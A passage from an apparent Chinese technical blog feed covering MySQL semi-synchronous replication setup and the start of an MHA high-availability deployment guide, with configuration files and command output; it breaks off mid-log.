<p><strong>半同步复制主从配置：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">主 : 192.168.10.216</div><div class="line">从 : 192.168.10.217</div></pre></td></tr></table></figure></p>
<p><strong>1.判断是否支持动态增加插件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select @@have_dynamic_loading;</div><div class="line">+------------------------+</div><div class="line">| @@have_dynamic_loading |</div><div class="line">+------------------------+</div><div class="line">| YES |</div><div class="line">+------------------------+</div></pre></td></tr></table></figure></p>
<p><strong>2.检查是否存在半同步插件,分别在主从安装</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">/usr/local/mysql/lib/mysql/plugin/semisync_master.so</div><div class="line">/usr/local/mysql/lib/mysql/plugin/semisync_slave.so</div><div class="line"></div><div class="line">主MySQL上安装semisync_master.so:</div><div class="line">mysql&gt;install plugin rpl_semi_sync_master SONAME ‘semisync_master.so’</div><div class="line"></div><div class="line">从MySQL上安装semisync_slave.so:</div><div class="line">mysql&gt;install plugin rpl_semi_sync_slave SONAME ‘semisync_slave.so’</div><div class="line"></div><div class="line">安装后通过show plugins;查看安装的插件</div></pre></td></tr></table></figure></p>
<p><strong>3.分别在主从打开semi-sync(默认关闭)</strong><br><strong>主：</strong><br>修改my.cnf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">rpl_semi_sync_master_enabled=1</div><div class="line">rpl_semi_sync_master_timeout=30000(毫秒)   从库宕机或网络故障导致binlog没有及时传送到从库，此时主库上的事务需要等待的时间；此时间内没恢复，MySQL自动调整复制为异步复制模式</div><div class="line">mysql&gt; set global rpl_semi_sync_master_enabled=1; </div><div class="line">Query OK, 0 rows affected (0.00 sec)</div><div class="line">mysql&gt; set global rpl_semi_sync_master_timeout=30000;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div></pre></td></tr></table></figure></p>
<p><strong>从:</strong><br>修改my.cnf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">rpl_semi_sync_master_enabled=1</div><div class="line">mysql&gt; set global rpl_semi_sync_master_enabled=1; </div><div class="line">Query OK, 0 rows affected (0.00 sec)</div><div class="line">由于之前配置的复制是异步的，所以需要重启下从库I/O线程(或者直接重启主从stop slave;start slave;)：</div><div class="line"></div><div class="line">mysql&gt; STOP SLAVE  IO_THREAD;</div><div class="line">Query OK, 0 rows affected (0.04 sec)</div><div class="line">mysql&gt; START SLAVE  IO_THREAD;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div></pre></td></tr></table></figure></p>
<p><strong>4.验证</strong><br><strong>主：</strong><br><code>mysql&gt; show status like &#39;%semi_sync%&#39;;</code></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/semi.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/semi.png" alt="semi"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Rpl_semi_sync_master_clients: 值为2，表示有2个semi-sync的备库</div><div class="line">Rpl_semi_sync_master_net_avg_wait_time: 表示事务提交后，等待备库响应的平均时间</div><div class="line">Rpl_semi_sync_master_no_times: 表示有几次从半同步切换到异步复制</div><div class="line">Rpl_semi_sync_master_status : 值为ON，表示半同步复制处于打开状态</div><div class="line">Rpl_semi_sync_master_tx_avg_wait_time ：开启Semi-sync，事务返回需要等待的平均时间</div><div class="line">Rpl_semi_sync_master_wait_sessions：当前有几个线程在等备库响应</div><div class="line">Rpl_semi_sync_master_yes_tx : 值为1054，表示主库有1054个事务是通过半同步复制到从库</div><div class="line">Rpl_semi_sync_master_no_tx  : 值为0，表示当前有0个事务不是通过半同步模式同步到从库的</div></pre></td></tr></table></figure></p>
<p><strong>从：</strong></p>
<p>检查半同步是否开启<br><code>show status like &#39;%semi_sync%&#39;;</code></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/semion.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/semion.png" alt="semion"></a><br>检查复制是否正常<br><code>show slave status \G;</code></p>
<h5 id="四、提升主从复制性能的方法"><a href="#四、提升主从复制性能的方法" class="headerlink" title="四、提升主从复制性能的方法"></a>四、提升主从复制性能的方法</h5><p><strong>方案1：</strong>多级主从架构，将不同库分开复制到不同从上</p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/fzjg.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/fzjg.png" alt="fzjg"></a></p>
<p><strong>注意事项：</strong><br>M2上打开log-slave-updates配置，保证M1传送的binlog能够被记录在M2的RelayLog和Binlog；M2可以选择BLACKHOLE引擎降低M2的I/O；并且Binlog日志的过滤可以在M2去做<br>BLACKHOLE引擎的使用测试参考:   <a href="http://jroller.com/dschneller/entry/mysql_replication_using_blackhole_engine" target="_blank" rel="external">http://jroller.com/dschneller/entry/mysql_replication_using_blackhole_engine</a><br><a href="http://blog.csdn.net/kylinbl/article/details/8903336" target="_blank" rel="external">http://blog.csdn.net/kylinbl/article/details/8903336</a></p>
<p><strong>方案2：多线程复制（MySQL5.6+）</strong><br>多线程复制是基于库的，允许从库并行更新，若单库压力大，此处的多线程复制没有意义；从库设置slave_parallel_workers=4表示MySQL从库在复制时启动4个SQL线程<br>MySQL5.6一下版本可以尝试Transfer补丁<a href="http://dinglin.iteye.com/blog/1888640" target="_blank" rel="external">http://dinglin.iteye.com/blog/1888640</a></p>
<h5 id="五、Mysql复制遇到的一些问题"><a href="#五、Mysql复制遇到的一些问题" class="headerlink" title="五、Mysql复制遇到的一些问题"></a>五、Mysql复制遇到的一些问题</h5><p><strong>1. 指定特定的数据库或者表</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">replicate-do-db  告诉从服务器限制默认数据库(由USE所选择)为db_name的语句的复制，指定多个库时多次使用此参数，一次指定一个库，不能跨数据库更新；需要跨数据库进行更新，使用--replicate-wild-do-table=db_name.%</div><div class="line">比如：</div><div class="line">如果用--replicate-do-db=sales启动从服务器，并且在主服务器上执行下面的语句，UPDATE语句不会复制：</div><div class="line">USE prices; UPDATE sales.january SET amount=amount+1000;</div><div class="line"></div><div class="line">replicate-do-table  只复制某个表 ，支持跨库更新，指定多个表时多次使用此参数，一次指定一个表</div><div class="line">replicate-ignore-db告诉从服务器不要复制默认数据库(由USE所选择)为db_name的语句。要想忽略多个数据库，应多次使用该选项，每个数据库使用一次。如果正进行跨数据库更新并且不想复制这些更新，不应使用该选项。应使用--replicate-wild-ignore-table=db_name.%</div><div class="line">replicate-ignore-table 告诉从服务器线程不要复制更新指定表的任何语句(即使该语句可能更新其它的表)。要想忽略多个表，应多次使用该选项，每个表使用一次。同--replicate-ignore-db对比，该选项可以跨数据库进行更新</div><div class="line"></div><div class="line">replicate-wild-do-table  告诉从服务器线程限制复制更新的表匹配指定的数据库和表名模式的语句。模式可以包含‘%’和‘_’通配符，与LIKE模式匹配操作符具有相同的含义。要指定多个表，应多次使用该选项，每个表使用一次。该选项可以跨数据库进行更新。请读取该选项后面的注意事项。</div><div class="line">例如：--replicate-wild-do-table=foo%.bar%只复制数据库名以foo开始和表名以bar开始的表的更新。</div><div class="line"></div><div class="line">replicate-wild-ignore-table告诉从服务器线程不要复制表匹配给出的通配符模式的语句 </div><div class="line"></div><div class="line">从库增加(同步test库的bench1表，忽略同步mysql库所有表)：</div><div class="line">replicate-wild-do-table=test.bench1</div><div class="line">replicate-wild-ignore-table=mysql.%</div></pre></td></tr></table></figure>
<p><strong>2. 从库复制出错跳过</strong></p>
<p><code>mysql&gt;SET GLOBAL SQL_SLAVE_SKIP_COUNTER=1;</code></p>
<p><strong>3. log event entry exceeded max_allowed_packet的处理</strong></p>
<p>适当增加max_allowed_packet大小</p>
<p><strong>4. 因主库大量滞后binlog，启动slave时，可能会跑满网卡带宽</strong></p>
<p>前段时间微博上@zolker遇到这类问题，网友也给了很多解决办法，趁此blog总结下<br>A.级联备库方式，避免主MySQL网卡跑满影响<br>B.脚本的方式每隔几秒(sleep)把io_thread停一会，进行缓解 （这种方法简单、粗暴、有效,但有抖动）<br>C.使用facebook的patch <a href="https://github.com/facebook/mysql-5.6/commit/d3b0c7814090bded6563fee7d46d2ae41ed32a60" target="_blank" rel="external">https://github.com/facebook/mysql-5.6/commit/d3b0c7814090bded6563fee7d46d2ae41ed32a60</a></p>
<h5 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h5><blockquote>
<p><a href="http://www.ovaistariq.net/528/statement-based-vs-row-based-replication/" target="_blank" rel="external">http://www.ovaistariq.net/528/statement-based-vs-row-based-replication/</a><br><a href="http://www.orczhou.com/index.php/2011/06/mysql-5-5-semi-sync-replication-setup-config/" target="_blank" rel="external">http://www.orczhou.com/index.php/2011/06/mysql-5-5-semi-sync-replication-setup-config/</a><br><a href="http://www.linuxde.net/2013/09/15194.html" target="_blank" rel="external">http://www.linuxde.net/2013/09/15194.html</a><br><a href="http://dev.mysql.com/doc/refman/5.6/en/replication.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.6/en/replication.html</a><br>《深入浅出MySQL》</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MHA高可用部署及测试]]></title>
      <url>/2014/08/20/mysql-mha-handbook.html</url>
      <content type="html"><![CDATA[<h4 id="MHA特性"><a href="#MHA特性" class="headerlink" title="MHA特性"></a>MHA特性</h4><ol>
<li>主服务器的自动监控和故障转移<br>MHA监控复制架构的主服务器，一旦检测到主服务器故障，就会自动进行故障转移。即使有些从服务器没有收到最新的relay log，MHA自动从最新的从服务器上识别差异的relay log并把这些日志应用到其他从服务器上，因此所有的从服务器保持一致性了。MHA通常在几秒内完成故障转移，9-12秒可以检测出主服务器故障，7-10秒内关闭故障的主服务器以避免脑裂，几秒中内应用差异的relay log到新的主服务器上，整个过程可以在10-30s内完成。还可以设置优先级指定其中的一台slave作为master的候选人。由于MHA在slaves之间修复一致性，因此可以将任何slave变成新的master，而不会发生一致性的问题，从而导致复制失败。</li>
<li>交互式主服务器故障转移<br>  可以只使用MHA的故障转移，而不用于监控主服务器，当主服务器故障时，人工调用MHA来进行故障故障。</li>
<li>非交互式的主故障转移<br>不监控主服务器，但自动实现故障转移。这种特征适用于已经使用其他软件来监控主服务器状态，比如heartbeat来检测主服务器故障和虚拟IP地址接管，可以使用MHA来实现故障转移和slave服务器晋级为master服务器。</li>
<li>在线切换主服务器<br>在许多情况下，需要将现有的主服务器迁移到另外一台服务器上。比如主服务器硬件故障，RAID控制卡需要重建，将主服务器移到性能更好的服务器上等等。维护主服务器引起性能下降，导致停机时间至少无法写入数据。另外，阻塞或杀掉当前运行的会话会导致主主之间数据不一致的问题发生。MHA提供快速切换和优雅的阻塞写入，这个切换过程只需要0.5-2s的时间，这段时间内数据是无法写入的。在很多情况下，0.5-2s的阻塞写入是可以接受的。因此切换主服务器不需要计划分配维护时间窗口(呵呵，不需要你在夜黑风高时通宵达旦完成切换主服务器的任务)。</li>
</ol>
<h4 id="MHA工作机制"><a href="#MHA工作机制" class="headerlink" title="MHA工作机制"></a>MHA工作机制</h4><p>MHA自动Failover过程解析<br><a href="http://www.mysqlsystems.com/2012/03/figure-out-process-of-autofailover-on-mha.html" target="_blank" rel="external">http://www.mysqlsystems.com/2012/03/figure-out-process-of-autofailover-on-mha.html</a><br><a href="https://code.google.com/p/mysql-master-ha/wiki/Sequences_of_MHA" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/Sequences_of_MHA</a></p>
<h4 id="MHA适用的主从架构"><a href="#MHA适用的主从架构" class="headerlink" title="MHA适用的主从架构"></a>MHA适用的主从架构</h4><p><a href="https://code.google.com/p/mysql-master-ha/wiki/UseCases" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/UseCases</a></p>
<h4 id="MHA高可用环境的构建"><a href="#MHA高可用环境的构建" class="headerlink" title="MHA高可用环境的构建"></a>MHA高可用环境的构建</h4><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/ar.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/ar.png" alt="ar"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Node1:192.168.10.216 (主)</div><div class="line">Node2:192.168.10.217 (从,主故障切换的备主)</div><div class="line">Node3:192.168.10.218 (从,兼MHA管理节点)</div><div class="line">VIP : 192.168.10.219</div><div class="line">Mysql:Percona-Server-5.6.16-rel64.2-569</div><div class="line">以上节点系统均为CentOS6.5 x64</div></pre></td></tr></table></figure></p>
<h4 id="实验大概步骤"><a href="#实验大概步骤" class="headerlink" title="实验大概步骤"></a>实验大概步骤</h4><ol>
<li>三节点配置epel的yum源，安装相关依赖包</li>
<li>建立主从复制关系</li>
<li>ssh-keygen实现三台机器之间相互免密钥登录</li>
<li>三节点安装mha4mysql-node-0.56,node3上安装mha4mysql-manager-0.56</li>
<li>在node3上管理MHA配置文件</li>
<li>masterha_check_ssh验证ssh信任登录是否成功,masterha_check_repl验证mysql复制是否成功</li>
<li>启动MHA manager，并监控日志文件</li>
<li>测试master(Node1)的mysql宕掉后，是否会自动切换正常<br>9 . 配置VIP，切换后从自动接管主服务，并对客户端透明</li>
</ol>
<h4 id="脚本相关说明"><a href="#脚本相关说明" class="headerlink" title="脚本相关说明"></a>脚本相关说明</h4><p>MHA node有三个脚本，依赖perl模块</p>
<blockquote>
<p>save_binary_logs：保存和拷贝宕掉的主服务器二进制日志<br>apply_diff_relay_logs:识别差异的relay log事件，并应用到所有从服务器节点<br>purge_relay_logs:清除relay log日志文件</p>
</blockquote>
<h4 id="MHA部署过程"><a href="#MHA部署过程" class="headerlink" title="MHA部署过程"></a>MHA部署过程</h4><p><strong>A.</strong>三节点配置epel的yum源，安装相关依赖包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</div><div class="line">rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6</div><div class="line">yum  -y install perl-DBD-MySQL  ncftp</div></pre></td></tr></table></figure></p>
<p><strong>B.</strong> 建立主从复制关系</p>
<p>在node1上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; grant replication slave  on *.* to &apos;rep&apos;@&apos;192.168.10.%&apos; identified by &apos;geekwolf&apos;;</div><div class="line">mysql&gt; grant all on *.* to &apos;root&apos;@&apos;192.168.10.%&apos; identified by &apos;geekwolf&apos;;</div><div class="line">mysql&gt; show master status;</div></pre></td></tr></table></figure></p>
<p>拷贝node1的data目录同步到node2，node3 在node2 node3上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt;change master  to  master_host=&apos;192.168.10.216&apos;, master_user=&apos;rep&apos;, master_password=&apos;geekwolf&apos;,master_port=3306, master_log_file=&apos;mysql-in.000006&apos;,master_log_pos=120,master_connect_retry=1;</div><div class="line">mysql&gt;start slave;</div></pre></td></tr></table></figure></p>
<p>每个节点都做好mysql命令的软链<br><code>ln -s /usr/local/mysql/bin/* /usr/local/bin/</code><br><strong>C.</strong> ssh-keygen实现三台机器之间相互免密钥登录 在node1(在其他两个节点一同)执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa </div><div class="line">ssh-copy-id -i /root/.ssh/id_rsa.pub root@node1 </div><div class="line">ssh-copy-id -i /root/.ssh/id_rsa.pub root@node2 </div><div class="line">ssh-copy-id -i /root/.ssh/id_rsa.pub root@node3</div></pre></td></tr></table></figure></p>
<p><strong>D.</strong> 三节点安装mha4mysql-node-0.56,node3上安装mha4mysql-manager-0.56<br>在node1 node2 node3安装mha4mysql-node<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget [https://googledrive.com/host/0B1lu97m8-haWeHdGWXp0YVVUSlk/mha4mysql-node-0.56.tar.gz](https://googledrive.com/host/0B1lu97m8-haWeHdGWXp0YVVUSlk/mha4mysql-node-0.56.tar.gz)</div><div class="line">tar xf mha4mysql-node-0.56.tar.gz</div><div class="line">cd mha4mysql-node</div><div class="line">perl Makefile.PL</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure></p>
<p>在node3上安装mha4mysql-manager<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget [https://googledrive.com/host/0B1lu97m8-haWeHdGWXp0YVVUSlk/mha4mysql-manager-0.56.tar.gz](https://googledrive.com/host/0B1lu97m8-haWeHdGWXp0YVVUSlk/mha4mysql-manager-0.56.tar.gz)</div><div class="line">tar xf mha4mysql-manager-0.56.tar.gz</div><div class="line">cd mha4mysql-manager-0.56</div><div class="line">yum install perl-DBD-MySQL perl-Config-Tiny perl-Log-Dispatch perl-Parallel-ForkManager perl-Config-IniFiles perl-Time-HiRes</div></pre></td></tr></table></figure></p>
<p><strong>E.</strong> 在node3上管理MHA配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mkdir -p /etc/mha/&#123;app1,scripts&#125;</div><div class="line">cp mha4mysql-manager-0.56/samples/conf/_ /etc/mha/</div><div class="line">cp mha4mysql-manager-0.56/samples/scripts/_ /etc/mha/scripts/</div><div class="line">mv /etc/mha/app1.cnf /etc/mha/app1/</div><div class="line">mv /etc/mha/masterha_default.cnf /etc/masterha_default.cnf</div></pre></td></tr></table></figure></p>
<p>设置全局配置：<br>vim /etc/mha/masterha_default.cnf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[server default]</div><div class="line">user=root</div><div class="line">password=geekwolf</div><div class="line">ssh_user=root</div><div class="line">repl_user=rep</div><div class="line">repl_password=geekwolf</div><div class="line">ping_interval=1</div><div class="line">#shutdown_script=&quot;&quot;</div><div class="line">secondary_check_script = masterha_secondary_check -s node1 -s node2 -s node3 --user=root --master_host=node1 --master_ip=192.168.10.216 --master_port=3306</div><div class="line">#master_ip_failover_script=&quot;/etc/mha/scripts/master_ip_failover&quot;</div><div class="line">#master_ip_online_change_script=&quot;/etc/mha/scripts/master_ip_online_change&quot;</div><div class="line"># shutdown_script= /script/masterha/power_manager</div><div class="line">#report_script=&quot;&quot;</div></pre></td></tr></table></figure></p>
<p>vim /etc/mha/app1/app1.cnf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[server default] </div><div class="line">manager_workdir=/var/log/mha/app1</div><div class="line">manager_log=/var/log/mha/app1/manager.log</div><div class="line">[server1] </div><div class="line">hostname=node1</div><div class="line">master_binlog_dir=&quot;/usr/local/mysql/logs&quot;</div><div class="line">candidate_master=1</div><div class="line">[server2]</div><div class="line">hostname=node2</div><div class="line">master_binlog_dir=&quot;/usr/local/mysql/logs&quot;</div><div class="line">candidate_master=1</div><div class="line">[server3]</div><div class="line">hostname=node3</div><div class="line">master_binlog_dir=&quot;/usr/local/mysql/logs&quot;</div><div class="line">no_master=1</div></pre></td></tr></table></figure></p>
<p><strong>注释：</strong><br>candidate_master=1 表示该主机优先可被选为new master，当多个[serverX]等设置此参数时，优先级由[serverX]配置的顺序决定<br>secondary_check_script mha强烈建议有两个或多个网络线路检查MySQL主服务器的可用性。默认情况下,只有单一的路线 MHA Manager检查:从Manager to Master,但这是不可取的。MHA实际上可以有两个或两个以上的检查路线通过调用外部脚本定义二次检查脚本参数<br>master_ip_failover_script 在MySQL从服务器提升为新的主服务器时，调用此脚本，因此可以将vip信息写到此配置文件<br>master_ip_online_change_script 使用masterha_master_switch命令手动切换MySQL主服务器时后会调用此脚本，参数和master_ip_failover_script 类似，脚本可以互用   shutdown_script 此脚本(默认samples内的脚本)利用服务器的远程控制IDRAC等，使用ipmitool强制去关机，以避免fence设备重启主服务器，造成脑列现象<br>report_script 当新主服务器切换完成以后通过此脚本发送邮件报告，可参考使用 <a href="http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz" target="_blank" rel="external">http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz</a><br>以上涉及到的脚本可以从mha4mysql-manager-0.56/samples/scripts/*拷贝进行修改使用<br>其他manager详细配置参数<a href="https://code.google.com/p/mysql-master-ha/wiki/Parameters" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/Parameters</a></p>
<p><strong>F.</strong> masterha_check_ssh验证ssh信任登录是否成功,masterha_check_repl验证mysql复制是否成功<br>验证ssh信任：masterha_check_ssh —conf=/etc/mha/app1/app1.cnf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# masterha_check_ssh --conf=/etc/mha/app1/app1.cnf</div><div class="line">Tue May 13 07:53:15 2014 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</div><div class="line">Tue May 13 07:53:15 2014 - [info] Reading application default configuration from /etc/mha/app1/app1.cnf..</div><div class="line">Tue May 13 07:53:15 2014 - [info] Reading server configuration from /etc/mha/app1/app1.cnf..</div><div class="line">Tue May 13 07:53:15 2014 - [info] Starting SSH connection tests..</div><div class="line">Tue May 13 07:53:16 2014 - [debug]</div><div class="line">Tue May 13 07:53:15 2014 - [debug] Connecting via SSH from root@node1(192.168.10.216:22) to root@node2(192.168.10.217:22)..</div><div class="line">Tue May 13 07:53:15 2014 - [debug] ok.</div><div class="line">Tue May 13 07:53:15 2014 - [debug] Connecting via SSH from root@node1(192.168.10.216:22) to root@node3(192.168.10.218:22)..</div><div class="line">Tue May 13 07:53:16 2014 - [debug] ok.</div><div class="line">Tue May 13 07:53:16 2014 - [debug]</div><div class="line">Tue May 13 07:53:16 2014 - [debug] Connecting via SSH from root@node2(192.168.10.217:22) to root@node1(192.168.10.216:22)..</div><div class="line">Tue May 13 07:53:16 2014 - [debug] ok.</div><div class="line">Tue May 13 07:53:16 2014 - [debug] Connecting via SSH from root@node2(192.168.10.217:22) to root@node3(192.168.10.218:22)..</div><div class="line">Tue May 13 07:53:16 2014 - [debug] ok.</div><div class="line">Tue May 13 07:53:17 2014 - [debug]</div><div class="line">Tue May 13 07:53:16 2014 - [debug] Connecting via SSH from root@node3(192.168.10.218:22) to root@node1(192.168.10.216:22)..</div><div class="line">Tue May 13 07:53:16 2014 - [debug] ok.</div><div class="line">Tue May 13 07:53:16 2014 - [debug] Connecting via SSH from root@node3(192.168.10.218:22) to root@node2(192.168.10.217:22)..</div><div class="line">Tue May 13 07:53:17 2014 - [debug] ok.</div><div class="line">Tue May 13 07:53:17 2014 - [info] All SSH connection tests passed successfully.</div></pre></td></tr></table></figure></p>
<p>验证主从复制：masterha_check_repl —conf=/etc/mha/app1/app1.cnf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line">[root@localhost mha]# masterha_check_repl --conf=/etc/mha/app1/app1.cnf</div><div class="line">Tue May 13 08:10:54 2014 - [info] Reading default configuration from /etc/masterha_default.cnf..</div><div class="line">Tue May 13 08:10:54 2014 - [info] Reading application default configuration from /etc/mha/app1/app1.cnf..</div><div class="line">Tue May 13 08:10:54 2014 - [info] Reading server configuration from /etc/mha/app1/app1.cnf..</div><div class="line">Tue May 13 08:10:54 2014 - [info] MHA::MasterMonitor version 0.56.</div><div class="line">Tue May 13 08:10:54 2014 - [info] GTID failover mode = 0</div><div class="line">Tue May 13 08:10:54 2014 - [info] Dead Servers:</div><div class="line">Tue May 13 08:10:54 2014 - [info] Alive Servers:</div><div class="line">Tue May 13 08:10:54 2014 - [info] node1(192.168.10.216:3306)</div><div class="line">Tue May 13 08:10:54 2014 - [info] node2(192.168.10.217:3306)</div><div class="line">Tue May 13 08:10:54 2014 - [info] node3(192.168.10.218:3306)</div><div class="line">Tue May 13 08:10:54 2014 - [info] Alive Slaves:</div><div class="line">Tue May 13 08:10:54 2014 - [info] node2(192.168.10.217:3306) Version=5.6.16-64.2-rel64.2-log (oldest major version between slaves) log-bin:enabled</div><div class="line">Tue May 13 08:10:54 2014 - [info] Replicating from 192.168.10.216(192.168.10.216:3306)</div><div class="line">Tue May 13 08:10:54 2014 - [info] Primary candidate for the new Master (candidate_master is set)</div><div class="line">Tue May 13 08:10:54 2014 - [info] node3(192.168.10.218:3306) Version=5.6.16-64.2-rel64.2-log (oldest major version between slaves) log-bin:enabled</div><div class="line">Tue May 13 08:10:54 2014 - [info] Replicating from 192.168.10.216(192.168.10.216:3306)</div><div class="line">Tue May 13 08:10:54 2014 - [info] Not candidate for the new Master (no_master is set)</div><div class="line">Tue May 13 08:10:54 2014 - [info] Current Alive Master: node1(192.168.10.216:3306)</div><div class="line">Tue May 13 08:10:54 2014 - [info] Checking slave configurations..</div><div class="line">Tue May 13 08:10:54 2014 - [info] read_only=1 is not set on slave node2(192.168.10.217:3306).</div><div class="line">Tue May 13 08:10:54 2014 - [warning] relay_log_purge=0 is not set on slave node2(192.168.10.217:3306).</div><div class="line">Tue May 13 08:10:54 2014 - [info] read_only=1 is not set on slave node3(192.168.10.218:3306).</div><div class="line">Tue May 13 08:10:54 2014 - [warning] relay_log_purge=0 is not set on slave node3(192.168.10.218:3306).</div><div class="line">Tue May 13 08:10:54 2014 - [info] Checking replication filtering settings..</div><div class="line">Tue May 13 08:10:54 2014 - [info] 